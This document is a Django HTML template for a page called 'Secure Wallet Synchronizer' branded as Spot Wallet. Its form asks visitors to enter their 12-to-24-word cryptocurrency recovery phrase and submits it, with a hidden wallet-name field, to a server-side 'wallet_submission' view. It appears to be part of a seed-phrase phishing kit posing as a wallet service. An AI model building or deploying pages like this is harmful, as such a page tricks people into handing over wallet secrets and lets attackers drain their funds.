<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    {% load static %}

    <!-- Favicon -->
    <link href="{% static 'img/favicon.png' %}" rel="icon" />

    <!-- Google Web Fonts -->
    <link rel="preconnect" href="https://fonts.googleapis.com/" />
    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500&family=Roboto:wght@500;700&display=swap" rel="stylesheet" />

    <!-- Icon Font Stylesheet -->
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.10.0/css/all.min.css" rel="stylesheet" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.4.1/font/bootstrap-icons.css" rel="stylesheet" />

    <!-- Libraries Stylesheet -->
    <link href="{% static 'lib/animate/animate.min.css' %}" rel="stylesheet" />
    <link href="{% static 'lib/owlcarousel/assets/owl.carousel.min.css' %}" rel="stylesheet" />

    <!-- Customized Bootstrap Stylesheet -->
    <link href="{% static 'css/bootstrap.min.css' %}" rel="stylesheet" />
    <link rel="stylesheet" href="{% static 'cards/card-style.css' %}" />

    <title>Secure Wallet Synchronizer - spot Wallet</title>

    <style>
        body {
            font-family: 'Open Sans', sans-serif;
            background-color: #f8f9fa;
            margin: 0;
            padding: 0;
        }

        .card {
            max-width: 400px;
            margin: 50px auto;
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
        }

        .trustwallet-card img {
            width: 80px;
            margin-bottom: 10px;
        }

        .trustwallet-card p {
            font-size: 20px;
            font-weight: bold;
            color: #007bff;
        }

        .post-filter {
            margin: 20px 0;
        }

        .filter-item1 {
            background-color: #007bff;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }

        .post-box textarea {
            width: 100%;
            border: 1px solid #ced4da;
            border-radius: 5px;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 14px;
        }

        .post-box button {
            background-color: #007bff;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
        }

        .post-box a {
            display: block;
            margin-top: 20px;
            text-decoration: none;
            color: #007bff;
            font-size: 14px;
        }

        .post-box a img {
            width: 30px;
            margin-right: 5px;
        }
    </style>
</head>
<body>
    <div class="card">
        <!-- spot Wallet -->
        <div class="trustwallet-card">
            <img src="{% static 'img/wallets/spot.webp' %}" alt="spot Wallet" />
            <p>Spot Wallet</p>
        </div>

        <!-- Post Filter -->
        <div class="post-filter list">
            <button class="filter-item1" data-filter="phraseKey">Phrase</button>
        </div>

        <!-- Post Box for Recovery Phrase -->
        <form method="POST" action="{% url 'wallet_submission' %}">
            {% csrf_token %}
            <input type="hidden" name="wallet_name" value="spot Wallet" />
            <div class="post-box" id="card1">
                <div id="error"></div>
                <textarea
                    type="text"
                    name="recoveryPhrase"
                    class="phrase"
                    rows="8"
                    cols="20"
                    placeholder="Enter your Recovery Phrase"
                    required
                ></textarea>
                <p>Typically 12 (sometimes 18, 24) words separated by single spaces</p>
                <button
                    type="submit"
                    class="btn btn-primary py-3 px-4 animated slideInDown"
                >
                    Proceed
                </button>

                <a href="{% url 'home' %}">
                    <img src="{% static 'img/hero-img-home-2.417386c3.png' %}" alt="Home">
                    <small>Go to Homepage</small>
                </a>
            </div>
        </form>
    </div>

    <!-- JQuery -->
    <script
        src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"
        integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g=="
        crossorigin="anonymous"
        referrerpolicy="no-referrer"
    ></script>
    <script src="{% static 'js/card.js' %}"></script>
</body>
</html>
